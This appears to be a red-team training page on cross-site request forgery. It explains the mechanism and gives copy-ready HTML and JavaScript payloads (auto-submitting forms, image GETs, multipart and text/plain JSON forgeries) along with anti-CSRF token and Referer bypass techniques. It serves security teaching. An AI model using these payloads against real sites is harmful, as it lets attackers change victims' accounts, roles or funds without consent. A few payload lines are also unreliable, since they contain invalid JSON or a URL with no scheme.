---
layout: training-page
title: "Cross-Site Request Forgery (CSRF) — Red Team Academy"
module: "Web Hacking"
tags:
  - csrf
  - xsrf
  - session-riding
  - cross-origin
page_key: "web-csrf"
render_with_liquid: false
---

# Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an authenticated user to unknowingly execute state-changing requests on a web application. Because browsers automatically attach session cookies to every request, an attacker-controlled page can trigger authenticated actions on a target site on behalf of the victim. CSRF targets state change (account updates, transfers, setting changes), not data theft — the attacker cannot read the response.

## Tools

- **XSRFProbe** — CSRF audit and exploitation toolkit — `github.com/0xInfection/XSRFProbe`

## How CSRF Works

When a user logs into a site, the server issues a session cookie stored in the browser. Every subsequent request to that site — including those triggered by other pages — automatically carries that cookie. An attacker hosts a page that makes a request to the target site; the browser attaches the victim's cookie, and the server processes the request as if the victim initiated it.

For exploitation to succeed:

- The victim must be authenticated on the target site
- The target action must rely solely on cookies for authentication
- There must be no unpredictable anti-CSRF token, or the token validation must be bypassable

## HTML GET — Requiring User Interaction

The simplest form: trick the victim into clicking a link. The browser sends the GET request with session cookies attached:

```
<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
```

## HTML GET — No User Interaction

A hidden image tag fires the GET request automatically when the page loads, with no click required:

```
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

## HTML POST — Requiring User Interaction

A form targeting the victim's site with hidden pre-filled fields. The victim must click submit:

```
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
  <input name="username" type="hidden" value="CSRFd" />
  <input type="submit" value="Submit Request" />
</form>
```

## HTML POST — Auto-Submit (No User Interaction)

JavaScript auto-submits the form when the page loads. The victim visits the attacker's page and the request fires silently:

```
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
  <input name="username" type="hidden" value="CSRFd" />
  <input type="submit" value="Submit Request" />
</form>

<script>
  document.getElementById("autosubmit").submit();
</script>
```

## HTML POST — Multipart File Upload

For endpoints that require `multipart/form-data` (file uploads), use the DataTransfer API to construct and submit the form programmatically:

```
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File( [ "CSRF-filecontent" ], "CSRF-filename" );
    dT.items.add( file );
    document.xss[0].files = dT.files;
    document.xss.submit()
}
</script>

<form style="display: none" name="xss" method="post" action="TARGET_URL" enctype="multipart/form-data">
  <input id="file" type="file" name="file"/>
  <input type="submit" name="" value="" size="0" />
</form>
<button value="button" onclick="launch()">Submit Request</button>
```

## JSON GET — Simple Request

Use XMLHttpRequest to make a cross-origin GET request. Note that for simple requests the browser sends cookies but does not trigger a preflight:

```
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

## JSON POST — Simple Request (text/plain Content-Type)

JSON APIs often only accept `application/json` content type, which triggers a preflight OPTIONS request that may block the attack. Using `text/plain` bypasses the preflight for simple requests:

```
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
// text/plain is a "simple" content type — no preflight triggered
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.send('{"role":admin}');
</script>
```

Alternative using auto-submit form with embedded JSON in a hidden field. This bypasses Firefox's Enhanced Tracking Protection Standard mode:

```
<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
  <!-- sends: {"role":admin,"other":"="} -->
  <input type="hidden" name='{"role":admin, "other":"' value='"}' />
</form>
<script>
  document.getElementById("CSRF_POC").submit();
</script>
```

## JSON POST — Complex Request (with Credentials)

This sends a POST with `application/json` and credentials. This is a "complex" request that triggers a preflight — exploitation only works if the server responds to OPTIONS with permissive CORS headers:

```
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

## CSRF Token Bypass Techniques

Applications often implement anti-CSRF tokens as a defense. Common weaknesses that allow bypass:

- **Token validation depends on request method** — the server validates the token on POST but not on GET; change the method to GET
- **Token validation depends on token being present** — remove the token parameter entirely and the server accepts the request
- **Token not tied to user session** — use a valid token from your own session to forge a request as another user
- **Token tied to non-session cookie** — if the attacker can set cookies (e.g., via a subdomain), they can plant their own token and use it in the forged request
- **Token duplicated in cookie** — the server just checks that the cookie and parameter match; the attacker can set both to an arbitrary value
- **Referer validation depends on header being present** — drop the Referer header entirely using a meta tag: `<meta name="referrer" content="no-referrer">`
- **Broken Referer validation** — add the target domain as a subdomain or path of the attacker domain: `http://victim.example.com.attacker.com/`

## Conditions Required for Exploitation

- A relevant action exists that the attacker wants to perform (e.g., change email, transfer funds)
- The action relies solely on cookies/HTTP auth — no unpredictable tokens required
- The request parameters are predictable (no secret value only the victim knows)

## Resources

- PayloadsAllTheThings — CSRF — `github.com/swisskyrepo/PayloadsAllTheThings`
- XSRFProbe — CSRF Audit Toolkit — `github.com/0xInfection/XSRFProbe`
- PortSwigger CSRF Web Security Academy — `portswigger.net/web-security/csrf`
- OWASP Cross-Site Request Forgery — `owasp.org/www-community/attacks/csrf`
- Cross-Site Request Forgery Cheat Sheet — Alex Lauerman — `trustfoundry.net/cross-site-request-forgery-cheat-sheet`
